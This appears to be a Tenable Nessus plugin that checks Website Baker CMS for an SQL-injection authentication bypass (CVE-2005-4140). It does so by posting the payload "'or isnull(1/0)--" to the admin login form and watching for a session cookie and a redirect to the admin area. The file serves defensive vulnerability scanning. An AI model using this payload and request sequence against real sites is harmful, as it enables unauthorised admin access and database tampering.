#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(20839);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2005-4140");
  script_bugtraq_id(15776);
  script_osvdb_id(21572);

  script_name(english:"Website Baker Admin Login SQL Injection");
  script_summary(english:"Checks for admin login SQL injection vulnerability in Website Baker");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is vulnerable to SQL
attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Website Baker, a PHP-based content
management system. 

The installed version of Website Baker fails to validate user input to
the username parameter of the 'admin/login/index.php' script before
using it to generate database queries.  An unauthenticated attacker
can leverage this issue to bypass authentication, disclose sensitive
information, modify data, or launch attacks against the underlying
database." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Dec/89" );
 script_set_attribute(attribute:"see_also", value:"http://download.websitebaker.org/websitebaker2/stable/2.6.1/#changelog" );
 script_set_attribute(attribute:"solution", value:
"Enable PHP's 'magic_quotes_gpc' setting or upgrade to Website Baker
version 2.6.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/12/08");
 script_cvs_date("$Date: 2016/11/03 14:16:37 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning", "global_settings/supplied_logins_only");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq("/wb", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  val = get_http_cookie(name: "wb_session_id");
  if (! isnull(val)) clear_cookiejar();

  # Check whether the affected script exists.
  url = string(dir, "/admin/login/index.php");
  r = http_send_recv3(method: "GET", item:url, port:port);
  if (isnull(r)) exit(0);

  # If it does...
  if (
    ">Website Baker<" >< r[2] &&
    'input type="hidden" name="username_fieldname"' >< r[2]
  ) {
    # Grab the username field name.
    pat = 'name="username_fieldname" value="([^"]+)"';
    matches = egrep(pattern:pat, string:r[2]);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        field = eregmatch(pattern:pat, string:match);
        if (!isnull(field)) {
          user_field = field[1];
          break;
        }
      }
    }

    # If we have the field name...
    if (!isnull(user_field)) {
      # Try to exploit the flaw to bypass authentication.
      if ("_" >< user_field) {
        pass_field = ereg_replace(
          pattern:"username(_.+)", 
          replace:"password\1", 
          string:user_field
        );
      }
      else pass_field = "password";

      postdata = string(
        "url=&",
        "username_fieldname=", user_field, "&",
        "password_fieldname=", pass_field, "&",
        user_field, "=", urlencode(str:"'or isnull(1/0)--"), "&",
        pass_field, "=", rand(), "&",
        "remember=false&",
        "submit=Login"
      );
      r = http_send_recv3(method: "POST", item: url, data: postdata, port: port,
add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
      if (isnull(r)) exit(0);

      val = get_http_cookie(name: "wb_session_id");
      # There's a problem if...
      if (
        # a session id was set and...
        ! isnull(val) && 
        # we're redirected to /admin/start
        egrep(pattern:"^Location: .+/admin/start", string:r[1])
      ) {
        security_hole(port);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }
}
